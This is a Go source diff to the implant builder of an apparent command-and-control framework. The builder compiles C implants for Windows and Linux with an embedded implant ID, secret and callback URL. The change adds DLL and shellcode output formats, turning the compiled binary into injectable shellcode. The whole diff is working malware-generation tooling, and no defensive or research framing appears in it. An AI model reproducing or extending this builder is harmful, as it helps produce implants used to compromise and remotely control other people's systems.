@@ -24,11 +24,14 @@ func BuildC(req *BuildRequest) (*BuildResult, error) {
 	if req.Arch != "amd64" {
 		return nil, fmt.Errorf("C implant only supports amd64 (got %q)", req.Arch)
 	}
-	if req.Format != "" && req.Format != FormatEXE {
-		return nil, fmt.Errorf("C implant only supports exe format (got %s); dll/shellcode not available for C yet", req.Format)
-	}
 	if req.Format == "" {
 		req.Format = FormatEXE
+	}
+	if req.OS == "linux" && req.Format != FormatEXE {
+		return nil, fmt.Errorf("C Linux implant only supports exe format (got %s)", req.Format)
+	}
+	if req.Format != FormatEXE && req.Format != FormatDLL && req.Format != FormatShellcode {
+		return nil, fmt.Errorf("C implant supports exe, dll, shellcode (got %s)", req.Format)
 	}
 
 	implantID, err := zcrypto.RandomID(16)
@@ -122,12 +125,11 @@ func BuildC(req *BuildRequest) (*BuildResult, error) {
 	cimplantDir := filepath.Join(absRoot, "cimplant")
 	buildDir := filepath.Join(absRoot, "build")
 	makeOS := "windows"
+	makeFormat := "exe"
 	outputFile := filepath.Join(buildDir, "implant_c.exe")
-	filename := "implant_c.exe"
 	if req.OS == "linux" {
 		makeOS = "linux"
 		outputFile = filepath.Join(buildDir, "implant_c_linux")
-		filename = "implant_c_linux"
 		if _, err := exec.LookPath("gcc"); err != nil {
 			return nil, fmt.Errorf("C Linux implant build requires gcc: %w", err)
 		}
@@ -135,10 +137,15 @@ func BuildC(req *BuildRequest) (*BuildResult, error) {
 		if _, err := exec.LookPath("x86_64-w64-mingw32-gcc"); err != nil {
 			return nil, fmt.Errorf("C Windows implant build requires mingw32: x86_64-w64-mingw32-gcc not found in PATH")
 		}
+		if req.Format == FormatDLL {
+			makeFormat = "dll"
+			outputFile = filepath.Join(buildDir, "implant_c.dll")
+		}
 	}
 
 	cmd := exec.CommandContext(ctx, "make", "all",
 		"OS="+makeOS,
+		"FORMAT="+makeFormat,
 		fmt.Sprintf("IMPLANT_ID=%s", implantID),
 		fmt.Sprintf("IMPLANT_SECRET=%s", secret),
 		fmt.Sprintf("CALLBACK_URL=%s", callbackURL),
@@ -171,21 +178,34 @@ func BuildC(req *BuildRequest) (*BuildResult, error) {
 		return nil, fmt.Errorf("read C implant output: %w", err)
 	}
 
+	outFmt := req.Format
+	if outFmt == FormatShellcode {
+		sc, err := PE2Shellcode(binary)
+		if err != nil {
+			return nil, fmt.Errorf("C PE to shellcode: %w", err)
+		}
+		binary = sc
+	}
+
 	buildID, err := zcrypto.RandomID(8)
 	if err != nil {
 		return nil, fmt.Errorf("generate build ID: %w", err)
 	}
 
-	if req.OS == "linux" {
+	filename := fmt.Sprintf("implant-%s.exe", buildID)
+	switch {
+	case req.OS == "linux":
 		filename = fmt.Sprintf("implant-%s-linux", buildID)
-	} else {
-		filename = fmt.Sprintf("implant-%s.exe", buildID)
+	case outFmt == FormatDLL:
+		filename = fmt.Sprintf("implant-%s.dll", buildID)
+	case outFmt == FormatShellcode:
+		filename = fmt.Sprintf("implant-%s.bin", buildID)
 	}
 	return &BuildResult{
 		BuildID:       buildID,
 		Binary:        binary,
 		Filename:      filename,
-		Format:        FormatEXE,
+		Format:        outFmt,
 		SizeBytes:     int64(len(binary)),
 		ImplantID:     implantID,
 		ImplantSecret: secret,
